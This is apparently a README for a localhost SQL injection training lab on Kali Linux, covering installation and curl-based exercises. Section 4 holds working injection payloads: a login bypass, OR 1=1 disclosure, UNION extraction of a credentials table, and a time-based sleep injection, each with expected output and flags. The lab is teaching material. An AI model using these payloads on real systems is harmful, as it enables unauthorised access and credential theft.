# 🐉 Kali Linux Installation & Penetration Testing Guide

This guide covers installing, configuring, and testing the **Cyberpunk Red Team: SQL Injection Testing & Learning Lab** on **Kali Linux** (2023.x / 2024.x / Rolling), as well as Debian-derived offensive distributions.

---

## 1. System Requirements on Kali Linux

- **OS**: Kali Linux 2023.1+ (x86_64 or ARM64 / Raspberry Pi / Apple Silicon VM).
- **Python**: Python 3.11 or newer (default on modern Kali releases).
- **Node.js** (Optional for development): v18+ or v20+.
- **Browser**: Firefox ESR (pre-installed on Kali) or Chromium.
- **Terminal**: QTerminal, Terminator, Tilix, or Kitty with TrueColor support.

---

## 2. Step-by-Step Installation

### Step 1: Update Apt Repositories & Install Dependencies

Open a terminal in Kali Linux and install the necessary system packages:

```bash
sudo apt update
sudo apt install -y python3 python3-pip python3-venv git curl
```

If you plan to modify or rebuild the frontend UI from source:

```bash
sudo apt install -y nodejs npm
```

---

### Step 2: Clone or Copy the Lab Repository

Navigate to your workspace and clone/copy the repository:

```bash
cd ~/Documents
# If using git:
# git clone <repository-url> sql-injection-lab
cd sql-injection-lab
```

---

### Step 3: Launch the Lab via `run.sh`

The included launcher script sets up a Python virtual environment, verifies dependencies, and starts the full-stack server on `127.0.0.1:8000`:

```bash
chmod +x run.sh
./run.sh
```

You will see the cyberpunk ASCII banner:

```text
======================================================================
    ██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗  
    ██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║  
    ██████╔╝█████╗  ██║  ██║       ██║   █████╗  ███████║██╔████╔██║  
    ██╔══██╗██╔══╝  ██║  ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║  
    ██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║  
    ╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  
       SQL INJECTION TESTING & DEFENSIVE LEARNING LABORATORY         
======================================================================
[+] Target Scope: Localhost only (127.0.0.1:8000)
[+] Starting Red Team Fullstack Application Server...
>>> OPEN IN YOUR BROWSER: http://127.0.0.1:8000 <<<
```

---

## 3. Accessing the Lab in Kali Linux

Open Firefox ESR or your preferred browser in Kali and navigate to:

```text
http://127.0.0.1:8000
```

- **Interactive GUI**: Full Red Team interface with Anime Hacker illustration, sound synthesis, WAF sandbox, and 7 lab environments.
- **REST API Docs**: Navigate to `http://127.0.0.1:8000/docs` for the interactive Swagger/OpenAPI documentation.

---

## 4. Manual Headless / Terminal Penetration Testing (Kali Tools)

Because the lab exposes standard HTTP REST endpoints on `127.0.0.1:8000`, students can test and verify exploits directly using Kali's command-line tools:

### A. Testing Lab 1 (Login Authentication Bypass) with cURL

```bash
# Exploit: admin' --
curl -s -X POST http://127.0.0.1:8000/api/labs/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' --", "password": "any", "mode": "vulnerable"}' | jq .
```

Expected Response:
```json
{
  "lab_id": "lab1_auth",
  "mode": "vulnerable",
  "success": true,
  "status_code": 200,
  "raw_query": "SELECT id, username, role, email FROM users WHERE username = 'admin' --' AND password_hash = 'any';",
  "message": "Access Granted! Authenticated as 'admin' (superadmin).",
  "flag": "FLAG{RED_TEAM_AUTH_BYPASS_99}"
}
```

---

### B. Testing Lab 2 (Unlisted Assets in Catalog) with cURL

```bash
curl -s "http://127.0.0.1:8000/api/labs/search?query='%20OR%201=1%20--&mode=vulnerable" | jq .
```

Expected Response reveals the classified item:
```json
{
  "name": "[CLASSIFIED] Chimera Zero-Day Kernel Rootkit",
  "is_public": 0,
  "flag": "FLAG{SEARCH_UNLISTED_ASSET_FOUND_42}"
}
```

---

### C. Testing Lab 4 (UNION Extraction) with cURL

```bash
curl -s "http://127.0.0.1:8000/api/labs/employees?department='%20UNION%20SELECT%20id,%20access_key,%20secret_token%20FROM%20secret_credentials%20--&mode=vulnerable" | jq .
```

Returns secret tokens and captures: `FLAG{UNION_DATA_EXFILTRATED_77}`.

---

### D. Testing Lab 7 (Time-Based Blind Latency) with cURL

```bash
time curl -s -X POST http://127.0.0.1:8000/api/labs/feedback \
  -H "Content-Type: application/json" \
  -d '{"author": "KaliTester", "comments": "test'\''); SELECT sleep(2); --", "mode": "vulnerable"}' | jq .
```

Notice the curl execution took **~2.01 seconds**, confirming latency execution!

---

## 5. Running via Docker on Kali Linux

If you prefer running under Docker on Kali:

```bash
# Install docker & docker-compose plugin
sudo apt update
sudo apt install -y docker.io docker-compose-plugin

# Start docker service
sudo systemctl enable --now docker

# Build and launch lab
sudo docker compose up --build
```

---

## 6. Resetting Lab State on Kali

To reset database records from terminal without opening the browser:

```bash
curl -s -X POST http://127.0.0.1:8000/api/system/reset-database | jq .
```

